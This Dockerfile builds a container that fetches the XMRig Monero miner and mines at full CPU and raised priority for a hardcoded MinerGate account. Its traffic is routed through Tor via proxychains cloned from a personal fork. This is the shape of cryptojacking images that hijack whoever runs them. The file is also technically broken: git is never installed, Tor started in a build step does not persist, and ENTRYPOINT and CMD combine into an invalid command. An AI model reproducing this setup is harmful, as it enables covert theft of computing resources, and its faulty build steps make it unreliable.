FROM ubuntu:xenial

RUN apt-get update && apt-get install -y wget && apt-get install -y sudo

RUN git clone https://github.com/whiteamelia09/proxychains.git && cd proxychains && ./configure && make && make install && make install-config

RUN sudo apt-get install -y tor && service tor start

ENV XMRIG_VERSION=2.8.3 XMRIG_SHA256=365198ed4f1205c42fa448d41c9088d3dea6bff43173c5e870e8bec4631c3a7d

RUN useradd -ms /bin/bash monero
USER monero
WORKDIR /home/monero

RUN wget https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-xenial-amd64.tar.gz &&\
  tar -xvzf xmrig-${XMRIG_VERSION}-xenial-amd64.tar.gz &&\
  mv xmrig-${XMRIG_VERSION}/xmrig . &&\
  rm -rf xmrig-${XMRIG_VERSION} &&\
  echo "${XMRIG_SHA256}  xmrig" | sha256sum -c -

ENTRYPOINT ["./xmrig"]
CMD ["proxychains4 ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --max-cpu-usage=100 --cpu-priority 4 --donate-level 1"]
